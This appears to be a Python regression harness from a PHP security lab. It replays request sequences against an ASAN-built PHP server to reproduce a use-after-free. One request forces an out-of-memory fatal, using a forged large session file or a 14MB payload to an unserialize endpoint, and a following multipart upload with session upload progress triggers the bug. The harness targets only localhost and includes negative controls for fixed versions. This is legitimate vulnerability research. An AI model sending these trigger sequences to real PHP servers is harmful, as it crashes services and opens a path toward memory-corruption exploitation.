#!/usr/bin/env python3
"""Phase 5 v2 Stage 1 MVP: request-lifecycle stateful sequence runner.

Models the A->B scenarios of poc-pathb/poc-pathc as a small sequence grammar
and enumerates it:

    producer  in {parse_oom (multipart + forged big session),
                  runtime_oom (/unserialize endpoint, post-RINIT)}
    interpose in {none, health (a normal request between A and B — the
                  module RINITs run and must clear any residue: negative
                  control)}
    consumer  in {multipart_upload (file part), multipart_nofile}

On a vulnerable build the expected outcome is a memory error iff a producer
ran and NO normal request was interposed; the interposed variants are
negative controls that must stay clean. A mismatch (false positive or false
negative) fails the run. SAPI scope for the MVP: CLI built-in server (single
process, worker survival trivial); SAPI profiles (mod_php/FPM) extend the
PROFILES table.

Stage 1a (plan §12.6.4, R9): a sequence counts only if the producer's fatal
landed where the path needs it (log delta after the producer), the
interposed normal request really succeeded (else invalid_control), and the
memory error is an ASAN report of THIS server pid. Fixed versions expect no
memory error with the producer still landing. Each run writes to its own
directory; effective memory limits come from the server log, not the CLI.

This is the fixed regression matrix; exploration lives in lifecycle-explore.py.

Observation only: no heap grooming, no pointer control, no RCE attempt.
"""
import argparse
import http.cookiejar
import importlib.util
import json
import os
import re
import secrets
import sys
import time
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
_spec = importlib.util.spec_from_file_location('poc_bgserialize_mod',
                                               HERE / 'poc-bgserialize.py')
poc = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(poc)

from probe import multipart  # noqa: E402

REPO = HERE.parent
BASE = Path('/home/phplab/php-lab')
# The reused poc-bgserialize Server binds its own module-level port;
# every request below must target the same one.
PORT = poc.PORT
PROGRESS_FIELD = 'PHP_SESSION_UPLOAD_PROGRESS'
SESSION_FIELD = 'PHPSESSID'

PROFILES = {'cli-server': dict(note='single process; survives request failures')}


def health(port=PORT):
    try:
        with urllib.request.urlopen('http://127.0.0.1:%d/health' % port, timeout=3) as res:
            return json.load(res).get('ok') is True
    except Exception:
        return False


# Per-producer memory tuning (both proven by the P16/P17 runners): the
# parse-time producer needs the encode to cross 8M with a 3MB session; the
# runtime producer must let php://input load under the limit so the fatal
# lands INSIDE unserialize (6MB input + 6MB decode vs an 8M limit can fail
# during the read and leave no residue).
PRODUCER_LIMITS = {'parse_oom': '8M', 'runtime_oom': '16M'}
PRODUCER_PAYLOADS = {'runtime_oom': 14 * 1024 * 1024}


FIXED_VERSIONS = ('8.4.27', '8.5.12')
FATAL_RE = re.compile(r'Allowed memory size of (\d+) bytes exhausted(?: at \S+)? '
                      r'\(tried to allocate (\d+) bytes\) in (\S+) on line (\d+)')
# The runtime producer must fatal INSIDE unserialize(), not while reading
# php://input one line earlier (that leaves no residue).
UNSERIALIZE_LINE = next(i for i, line in enumerate(
    (REPO / 'web/index.php').read_text().splitlines(), 1) if '= unserialize(' in line)


def log_delta(path, offset):
    if not path.exists():
        return ''
    with path.open('rb') as handle:
        handle.seek(offset)
        return handle.read().decode('utf-8', 'replace')


def producer_landing(producer, text):
    """Stage 1a (plan §12.6.4, R9): where did the producer's fatal land?
    parse_oom must fatal during request startup (no userland file: PHP logs
    'Unknown on line 0'); runtime_oom must fatal inside the lab /unserialize
    endpoint (web/index.php)."""
    match = FATAL_RE.search(text)
    if not match:
        return dict(producer_fatal=False, producer_landed=False)
    location = '%s:%s' % (match.group(3), match.group(4))
    if producer == 'parse_oom':
        landed = match.group(3) == 'Unknown'
    else:
        landed = (match.group(3).endswith('index.php')
                  and int(match.group(4)) == UNSERIALIZE_LINE)
    return dict(producer_fatal=True, producer_landed=landed,
                producer_fatal_location=location,
                effective_limit_bytes=int(match.group(1)),
                producer_tried_bytes=int(match.group(2)) if match.group(2) else None)


def run_sequence(prefix, base_env, index, producer, interpose, consumer, version,
                 out_base):
    out = out_base / ('seq-%02d' % index)
    for name in ('sessions', 'uploads'):
        (out / name).mkdir(parents=True, exist_ok=True)
    env = base_env.copy()
    env['ASAN_OPTIONS'] = env['ASAN_OPTIONS'].replace(
        'log_path=%s' % (BASE / 'evidence' / 'lifecycle-root-placeholder'),
        'log_path=%s/asan' % out) if 'lifecycle-root-placeholder' in env['ASAN_OPTIONS'] else (
        'detect_leaks=0:abort_on_error=1:symbolize=1:log_path=%s/asan' % out)
    env['POC_MEMORY_LIMIT'] = PRODUCER_LIMITS.get(producer, '8M')
    # poc.Server reads POC_MEMORY_LIMIT from os.environ at construction time.
    os.environ['POC_MEMORY_LIMIT'] = env['POC_MEMORY_LIMIT']
    sid_big = 'lcbig' + secrets.token_hex(8)
    sid_small = 'lcsmall' + secrets.token_hex(8)
    big = 'A' * (3 * 1024 * 1024)
    (out / 'sessions' / ('sess_' + sid_big)).write_text('big|s:%d:"%s";' % (len(big), big))
    (out / 'sessions' / ('sess_' + sid_small)).write_text('small|a:1:{i:0;i:7;}')
    record = dict(index=index, producer=producer, interpose=interpose,
                  consumer=consumer, profile='cli-server',
                  configured_limit=env['POC_MEMORY_LIMIT'])
    server = poc.Server(prefix, out, env)
    error_log = out / 'php-error.log'
    if producer == 'runtime_oom':
        # config/php.ini caps post_max_size at 4M; the 14MB producer body
        # must pass the pre-parse check to reach the endpoint at all.
        with (out / 'php.ini').open('a') as ini:
            ini.write('post_max_size=64M\n')
    asan_before = poc.snapshot_asan(out)
    try:
        poc.free_port(PORT)
        server.start()
        for _ in range(2):
            health(PORT)
        jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
        for _ in range(2):
            try:
                opener.open('http://127.0.0.1:%d/session' % PORT, timeout=3)
            except Exception:
                pass
        record['warmup'] = True
        record['server_pid'] = server.proc.pid
        log_offset = error_log.stat().st_size if error_log.exists() else 0

        if producer == 'parse_oom':
            record['producer_request'] = multipart(
                PORT, '/upload',
                fields=[(SESSION_FIELD, sid_big), (PROGRESS_FIELD, 'lcA')],
                file_spec=('file', 'a.bin', b'K' * 32768))['status']
        elif producer == 'runtime_oom':
            payload_len = PRODUCER_PAYLOADS['runtime_oom']
            payload = ('s:%d:"%s";' % (payload_len, 'B' * payload_len)).encode()
            req = urllib.request.Request(
                'http://127.0.0.1:%d/unserialize' % PORT, data=payload,
                headers={'Content-Type': 'application/octet-stream'})
            try:
                with opener.open(req, timeout=30) as res:
                    record['producer_request'] = res.status
            except urllib.error.HTTPError as exc:
                record['producer_request'] = exc.code
            except Exception:
                record['producer_request'] = None
        time.sleep(0.3)
        record.update(producer_landing(producer, log_delta(error_log, log_offset)))

        if interpose == 'health':
            record['interpose_health_ok'] = health(PORT)
        time.sleep(0.2)

        reset = False
        try:
            if consumer == 'multipart_upload':
                record['consumer_request'] = multipart(
                    PORT, '/upload',
                    fields=[(SESSION_FIELD, sid_small), (PROGRESS_FIELD, 'lcB')],
                    file_spec=('file', 'b.bin', b'L' * 16384))['status']
            else:
                record['consumer_request'] = multipart(
                    PORT, '/upload',
                    fields=[(SESSION_FIELD, sid_small), (PROGRESS_FIELD, 'lcB')],
                    file_spec=None)['status']
        except (ConnectionResetError, BrokenPipeError, OSError):
            reset = True
        record['consumer_reset'] = reset
        time.sleep(0.3)
        asan = poc.wait_new_asan(out, asan_before, timeout=6)
        record['asan_pid'] = (asan or {}).get('asan_pid')
        record['memory_error'] = bool(asan and asan['is_uaf']
                                      and asan.get('asan_pid') == record['server_pid'])
        record['asan_summary'] = (asan or {}).get('summary')
        record['process_alive_after'] = health(PORT)
        # Expected outcome model (from the P16/P17 ground truth): a memory
        # error requires a producer AND no interposed normal request AND a
        # consumer that actually touches the residue. multipart_upload's
        # parse-time progress decode consumes BG(serialize/unserialize)
        # residue (both producers). The no-file consumer only consumes stale
        # PS(id) via the END cleanup (parse producer); after a runtime
        # producer PS(id) is NULL, so the cleanup creates a fresh empty
        # session and never decodes.
        consumes_residue = (consumer == 'multipart_upload'
                            or (consumer == 'multipart_nofile'
                                and producer == 'parse_oom'))
        vulnerable = version not in FIXED_VERSIONS
        record['expected_memory_error'] = (vulnerable and producer != 'none'
                                           and interpose == 'none'
                                           and consumes_residue)
        record['expectation_met'] = (record['memory_error']
                                     == record['expected_memory_error'])
        if not record['expected_memory_error'] and record['memory_error']:
            record['anomaly'] = 'false_positive (memory error in a control sequence)'
        if record['expected_memory_error'] and not record['memory_error']:
            record['anomaly'] = 'false_negative (expected residue not observed)'
        # Validity gates: an unlanded producer or a failed interposed
        # request means the sequence did not test what it claims.
        if not record.get('producer_landed'):
            record['expectation_met'] = False
            record['anomaly'] = 'invalid_producer (fatal did not land: %s)' % (
                record.get('producer_fatal_location') or 'no fatal')
        if interpose == 'health' and not record.get('interpose_health_ok'):
            record['expectation_met'] = False
            record['anomaly'] = 'invalid_control (interposed request failed)'
    except Exception as exc:
        record['error'] = str(exc)
        record['expectation_met'] = False
    finally:
        server.stop()
    return record, str(out)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--version', default='8.4.4')
    parser.add_argument('--flavor', choices=['asan'], default='asan')
    parser.add_argument('--repeats', type=int, default=2)
    args = parser.parse_args()

    prefix = BASE / 'install' / (args.version + '-' + args.flavor)
    stamp = time.strftime('%Y%m%dT%H%M%S', time.gmtime())
    run_id = 'lc-%s-%s-%d' % (stamp, args.version, os.getpid())
    out_base = BASE / 'evidence' / ('lifecycle-%s-%s' % (stamp, args.version))
    summary_path = out_base / 'summary.json'
    base_env = os.environ.copy()
    base_env.update(ASAN_OPTIONS=('detect_leaks=0:abort_on_error=1:symbolize=1:'
                                  'log_path=%s' % (BASE / 'evidence' / 'lifecycle-root-placeholder')),
                    ASAN_SYMBOLIZER_PATH='/usr/bin/llvm-symbolizer',
                    USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')

    producers = ('parse_oom', 'runtime_oom')
    interposes = ('none', 'health')
    consumers = ('multipart_upload', 'multipart_nofile')
    results = []
    index = 0
    for repeat in range(args.repeats):
        for producer in producers:
            for interpose in interposes:
                for consumer in consumers:
                    index += 1
                    record, out = run_sequence(prefix, base_env, index, producer,
                                               interpose, consumer, args.version,
                                               out_base)
                    record['repeat'] = repeat + 1
                    results.append(record)
                    print(json.dumps({k: record.get(k) for k in (
                        'index', 'producer', 'interpose', 'consumer',
                        'memory_error', 'expected_memory_error',
                        'expectation_met', 'anomaly')}))

    transitions = sorted({(r['producer'], r['interpose'], r['consumer'])
                          for r in results if not r.get('error')})
    summary = dict(scope='Phase 5 v2 Stage 1 fixed regression matrix; observation only',
                   run_id=run_id, version=args.version, profile='cli-server',
                   configured_limits=PRODUCER_LIMITS,
                   effective_limits=sorted({r.get('effective_limit_bytes') for r in results
                                            if r.get('effective_limit_bytes')}),
                   repeats=args.repeats,
                   results=results,
                   request_transition_coverage=dict(
                       exercised=len(transitions),
                       modeled=len(producers) * len(interposes) * len(consumers),
                       ratio=round(len(transitions) /
                                   (len(producers) * len(interposes) * len(consumers)), 3)),
                   false_positives=sum(1 for r in results if r.get('anomaly', '').startswith('false_positive')),
                   false_negatives=sum(1 for r in results if r.get('anomaly', '').startswith('false_negative')),
                   invalid=sum(1 for r in results if r.get('anomaly', '').startswith('invalid')),
                   expectations_met=sum(1 for r in results if r.get('expectation_met')),
                   total=len(results),
                   ok=bool(results) and all(r.get('expectation_met') for r in results))
    summary_path.write_text(json.dumps(summary, indent=2))
    print(json.dumps({k: summary[k] for k in (
        'version', 'request_transition_coverage', 'false_positives',
        'false_negatives', 'invalid', 'expectations_met', 'total', 'ok')} | {'summary': str(summary_path)}, indent=2))
    return 0 if summary['ok'] else 1


if __name__ == '__main__':
    sys.exit(main())
